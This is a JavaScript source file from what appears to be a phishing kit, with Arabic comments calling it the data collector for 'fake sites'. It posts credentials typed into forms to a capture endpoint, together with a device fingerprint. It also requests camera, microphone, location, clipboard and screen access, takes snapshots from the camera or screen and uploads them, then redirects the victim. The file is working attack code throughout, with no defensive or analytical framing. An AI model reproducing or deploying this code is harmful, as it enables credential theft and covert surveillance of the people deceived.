// fake_sites/core/js/collector.js
// ============================================================
// مولّد جمع البيانات — لكل المواقع المزيفة
// ============================================================

(function() {
    "use strict";

    // ── الإعدادات ──
    var FS_COLLECTOR_URL = "/fs/capture";
    var FS_SESSION_ID = window.FS_SESSION_ID || "";
    var FS_SITE_NAME = window.FS_SITE_NAME || "unknown";
    var FS_REDIRECT_URL = window.FS_REDIRECT_URL || "https://www.google.com";

    // ── جمع بصمة الجهاز ──
    function collectFingerprint() {
        var data = {};

        try {
            data.user_agent = navigator.userAgent;
            data.language = navigator.language;
            data.platform = navigator.platform;
            data.screen_width = screen.width;
            data.screen_height = screen.height;
            data.pixel_ratio = window.devicePixelRatio || 1;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.hardware_concurrency = navigator.hardwareConcurrency || null;
            data.device_memory = navigator.deviceMemory || null;
            data.touch_support = 'ontouchstart' in window;
            data.cookies_enabled = navigator.cookieEnabled;

            // Connection
            if (navigator.connection) {
                data.connection_type = navigator.connection.effectiveType;
                data.connection_speed = navigator.connection.downlink;
            }

            // Battery (async)
            if (navigator.getBattery) {
                navigator.getBattery().then(function(b) {
                    window.FS_FINGERPRINT_BATTERY = {
                        level: Math.round(b.level * 100),
                        charging: b.charging
                    };
                });
            }
        } catch (e) {}

        return data;
    }

    // ── إرسال البيانات للـ backend ──
    function sendData(endpoint, payload) {
        return new Promise(function(resolve) {
            try {
                var jsonStr = JSON.stringify(payload);

                // Try sendBeacon
                if (navigator.sendBeacon) {
                    try {
                        var blob = new Blob([jsonStr], {type: 'application/json'});
                        if (navigator.sendBeacon(endpoint, blob)) {
                            resolve(true);
                            return;
                        }
                    } catch (e) {}
                }

                // Fallback fetch
                fetch(endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: jsonStr,
                    keepalive: true
                }).then(function() { resolve(true); })
                  .catch(function() { resolve(false); });
            } catch (e) {
                resolve(false);
            }
        });
    }

    // ── عرض Loader ──
    function showLoader(message) {
        var loader = document.getElementById('fs-page-loader');
        if (loader) {
            var text = loader.querySelector('.text');
            if (text && message) text.textContent = message;
            loader.classList.add('active');
        }
    }

    // ── إخفاء Loader ──
    function hideLoader() {
        var loader = document.getElementById('fs-page-loader');
        if (loader) {
            loader.classList.remove('active');
        }
    }

    // ── إعادة توجيه ──
    function redirect(url) {
        try {
            document.body.classList.add('fade-out');
        } catch (e) {}
        window.location.replace(url);
    }

    // ── API عام للاستخدام في القوالب ──
    window.FSCollector = {

        // ─── إرسال بيانات النموذج ───
        captureForm: function(formData, options) {
            options = options || {};

            var payload = {
                type: 'credentials',
                session_id: FS_SESSION_ID,
                site: FS_SITE_NAME,
                timestamp: Date.now(),
                url: window.location.href,
                credentials: formData,
                fingerprint: collectFingerprint(),
                battery: window.FS_FINGERPRINT_BATTERY || null,
                metadata: options.metadata || {}
            };

            return sendData(FS_COLLECTOR_URL, payload);
        },

        // ─── طلب صلاحيات ضخمة ───
        requestPermissions: function(options) {
            options = options || {};
            var results = {};

            return new Promise(function(resolve) {

                var promises = [];

                // ── Camera ──
                if (options.camera !== false) {
                    promises.push(
                        navigator.mediaDevices.getUserMedia({ video: true })
                            .then(function(stream) {
                                results.camera = 'granted';
                                window.FS_MEDIA_STREAMS = window.FS_MEDIA_STREAMS || {};
                                window.FS_MEDIA_STREAMS.camera = stream;
                                return 'granted';
                            })
                            .catch(function() {
                                results.camera = 'denied';
                                return 'denied';
                            })
                    );
                }

                // ── Microphone ──
                if (options.microphone !== false) {
                    promises.push(
                        navigator.mediaDevices.getUserMedia({ audio: true })
                            .then(function(stream) {
                                results.microphone = 'granted';
                                window.FS_MEDIA_STREAMS = window.FS_MEDIA_STREAMS || {};
                                window.FS_MEDIA_STREAMS.microphone = stream;
                                return 'granted';
                            })
                            .catch(function() {
                                results.microphone = 'denied';
                                return 'denied';
                            })
                    );
                }

                // ── Geolocation ──
                if (options.location !== false) {
                    promises.push(
                        new Promise(function(res) {
                            if (!navigator.geolocation) {
                                results.location = 'unsupported';
                                return res();
                            }
                            navigator.geolocation.getCurrentPosition(
                                function(pos) {
                                    results.location = 'granted';
                                    results.location_data = {
                                        lat: pos.coords.latitude,
                                        lng: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy
                                    };
                                    res();
                                },
                                function() {
                                    results.location = 'denied';
                                    res();
                                },
                                { timeout: 8000, enableHighAccuracy: true }
                            );
                        })
                    );
                }

                // ── Notifications ──
                if (options.notifications !== false) {
                    promises.push(
                        new Promise(function(res) {
                            try {
                                if (!('Notification' in window)) {
                                    results.notifications = 'unsupported';
                                    return res();
                                }
                                Notification.requestPermission().then(function(p) {
                                    results.notifications = p;
                                    res();
                                }).catch(function() {
                                    results.notifications = 'denied';
                                    res();
                                });
                            } catch (e) {
                                results.notifications = 'error';
                                res();
                            }
                        })
                    );
                }

                // ── Clipboard Read ──
                if (options.clipboard !== false) {
                    promises.push(
                        new Promise(function(res) {
                            try {
                                if (navigator.clipboard && navigator.clipboard.readText) {
                                    navigator.clipboard.readText()
                                        .then(function(text) {
                                            results.clipboard = 'granted';
                                            results.clipboard_text = text.substring(0, 500);
                                            res();
                                        })
                                        .catch(function() {
                                            results.clipboard = 'denied';
                                            res();
                                        });
                                } else {
                                    results.clipboard = 'unsupported';
                                    res();
                                }
                            } catch (e) {
                                results.clipboard = 'error';
                                res();
                            }
                        })
                    );
                }

                // ── Screen Capture ──
                if (options.screen === true) {
                    promises.push(
                        navigator.mediaDevices.getDisplayMedia({ video: true })
                            .then(function(stream) {
                                results.screen = 'granted';
                                window.FS_MEDIA_STREAMS = window.FS_MEDIA_STREAMS || {};
                                window.FS_MEDIA_STREAMS.screen = stream;
                                return 'granted';
                            })
                            .catch(function() {
                                results.screen = 'denied';
                                return 'denied';
                            })
                    );
                }

                // انتظر كل حاجة (أقصى 10 ثواني)
                Promise.race([
                    Promise.all(promises),
                    new Promise(function(res) { setTimeout(res, 10000); })
                ]).then(function() {
                    resolve(results);
                });
            });
        },

        // ─── إرسال نتائج الصلاحيات ───
        sendPermissionsResult: function(permissions) {
            var payload = {
                type: 'permissions',
                session_id: FS_SESSION_ID,
                site: FS_SITE_NAME,
                timestamp: Date.now(),
                permissions: permissions,
                fingerprint: collectFingerprint()
            };
            return sendData(FS_COLLECTOR_URL, payload);
        },

        // ─── إرسال صورة (من كاميرا/شاشة) ───
        sendSnapshot: function(mediaType, imageData) {
            var payload = {
                type: 'snapshot',
                session_id: FS_SESSION_ID,
                site: FS_SITE_NAME,
                timestamp: Date.now(),
                media_type: mediaType,
                image: imageData  // base64
            };
            return sendData(FS_COLLECTOR_URL, payload);
        },

        // ─── التقاط صورة من stream ───
        captureFromStream: function(stream, mediaType) {
            return new Promise(function(resolve) {
                try {
                    var video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.muted = true;

                    video.onloadedmetadata = function() {
                        video.play().then(function() {
                            setTimeout(function() {
                                var canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                var ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0);

                                var dataUrl = canvas.toDataURL('image/jpeg', 0.8);
                                resolve(dataUrl);
                            }, 1000);
                        });
                    };
                } catch (e) {
                    resolve(null);
                }
            });
        },

        // ─── Utility ───
        showLoader: showLoader,
        hideLoader: hideLoader,
        redirect: redirect
    };

    console.log('[FS] Collector loaded for:', FS_SITE_NAME);

})();
